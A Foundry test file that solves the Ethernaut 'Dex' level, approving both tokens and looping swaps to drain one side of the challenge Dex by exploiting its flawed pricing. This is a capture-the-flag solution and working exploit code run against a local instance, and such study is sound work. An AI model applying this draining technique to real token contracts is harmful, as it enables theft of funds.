// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/22-Dex/DexFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        address token1 = ethernautDex.token1();
        address token2 = ethernautDex.token2();

        IERC20(token1).approve(address(ethernautDex), type(uint256).max);
        IERC20(token2).approve(address(ethernautDex), type(uint256).max);

        ethernautDex.swap(
            token1,
            token2,
            ethernautDex.balanceOf(token1, attacker)
        );

        bool done;
        uint256 dexToken1Bal;
        uint256 dexToken2Bal;
        uint256 attackerToken1Bal;
        uint256 attackerToken2Bal;

        while (!done) {
            dexToken1Bal = ethernautDex.balanceOf(
                token1,
                address(ethernautDex)
            );
            dexToken2Bal = ethernautDex.balanceOf(
                token2,
                address(ethernautDex)
            );

            attackerToken1Bal = ethernautDex.balanceOf(token1, attacker);
            attackerToken2Bal = ethernautDex.balanceOf(token2, attacker);

            if (attackerToken1Bal == 0) {
                uint256 swapAmt = attackerToken2Bal > dexToken2Bal
                    ? dexToken2Bal
                    : attackerToken2Bal;
                ethernautDex.swap(token2, token1, swapAmt);
            }

            if (attackerToken2Bal == 0) {
                uint256 swapAmt = attackerToken1Bal > dexToken1Bal
                    ? dexToken1Bal
                    : attackerToken1Bal;
                ethernautDex.swap(token1, token2, swapAmt);
            }

            done = dexToken1Bal == 0 || dexToken2Bal == 0;
        }

        // ethernautDex.swap(token1, token2, 10);
        // ethernautDex.swap(token2, token1, 20);
        // ethernautDex.swap(token1, token2, 24);
        // ethernautDex.swap(token2, token1, 30);
        // ethernautDex.swap(token1, token2, 41);
        // ethernautDex.swap(token2, token1, 45);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
